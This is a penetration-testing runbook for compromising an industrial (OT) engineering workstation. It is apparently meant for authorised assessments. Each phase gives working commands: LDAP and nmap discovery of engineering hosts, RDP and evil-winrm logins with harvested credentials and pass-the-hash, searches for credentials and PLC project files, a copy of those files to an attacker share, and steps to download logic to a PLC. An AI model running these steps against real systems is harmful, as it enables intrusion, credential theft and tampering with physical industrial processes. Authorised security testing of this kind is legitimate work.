# Runbook: Engineering workstation compromise

## Objective

Compromise an OT engineering workstation to access project files, credentials, and engineering software that provide the capability to deploy modified logic to PLCs. The objective is demonstrating the access and capability, not executing unauthorised changes to production logic.

## Phase 1: Identify and reach the engineering workstation

Engineering workstations are typically in the IT/OT boundary or Level 3 network. Identify them by:

```bash
# Search Active Directory for computer descriptions mentioning engineering tools
ldapsearch -x -H ldap://<DC> -b "DC=target,DC=corp" \
  "(&(objectClass=computer)(description=*TIA*)(description=*Studio*))" cn description

# Look for hostnames
for prefix in eng scada hmi plc ot ics workstation; do
  host $prefix.target.corp 2>/dev/null
done

# Shodan/internal scan for Siemens S7 management port (TCP 102) from engineering WS
nmap -p 102 10.20.0.0/24 -T2
```

## Phase 2: Gain access to the workstation

Credential-based access is the cleanest approach:

```bash
# Test harvested credentials against RDP
xfreerdp /u:domain\\enguser /p:password /v:10.20.0.15

# Evil-WinRM if WinRM is available
evil-winrm -i 10.20.0.15 -u enguser -p password

# Pass-the-hash if an NTLM hash was obtained from the IT network
evil-winrm -i 10.20.0.15 -u enguser -H <ntlm-hash>
```

## Phase 3: Enumerate engineering software and project files

Once on the workstation:

```powershell
# Find TIA Portal project files
Get-ChildItem -Path C:\ -Recurse -Filter "*.ap*" 2>$null | Select FullName
# .ap15, .ap16, .ap17, .ap18, .ap19 = TIA Portal project versions

# Find Studio 5000 project files
Get-ChildItem -Path C:\ -Recurse -Filter "*.ACD" 2>$null | Select FullName

# Find other engineering files
Get-ChildItem -Path C:\ -Recurse -Include "*.gsd","*.eds","*.sdf" 2>$null

# Check Windows Credential Manager for stored PLC credentials
cmdkey /list

# Check for plaintext credentials in project configuration files
Select-String -Path "C:\Program Files\*\*.ini","C:\ProgramData\*\*.cfg" -Pattern "password" -Recurse
```

## Phase 4: Extract and analyse project files

Transfer the project files to an offline analysis environment:

```bash
# Exfiltrate project files via SMB or HTTP
# From the workstation:
copy "C:\Projects\PlantProject.ap19" \\<attacker-share>\exfil\
```

In the offline environment, open the project file with the appropriate engineering software (or parse it without the software using vendor documentation):

- Read the tag database to understand which registers correspond to which physical process values.
- Identify safety-relevant parameters: high/low alarms, emergency stop conditions, interlock logic.
- Identify the PLC IP addresses and connection configuration.
- Note the software version and download method (online or offline project download).

## Phase 5: Demonstrate logic deployment capability

If in scope and confirmed safe, demonstrate the capability to connect to a designated test PLC and deploy a project download:

```
TIA Portal: Project > Connect to device > Online > Download to device
Studio 5000: Communications > Download
```

The demonstration of capability (successful connection in online mode, confirmed access to the device's program memory) is the finding. Do not deploy modified logic to production devices.

Document: which PLCs the engineering workstation has configured connections to, whether connections succeed, and what the software reports about the device's current program (confirming read access to production logic).

## Evidence collection

Capture: the software version installed, the project files found and their content (tag database and PLC addresses), any credentials recovered from the workstation, and the result of any online connection attempt to a PLC. A screenshot of the engineering software in online mode with a PLC is a clear demonstration of access.
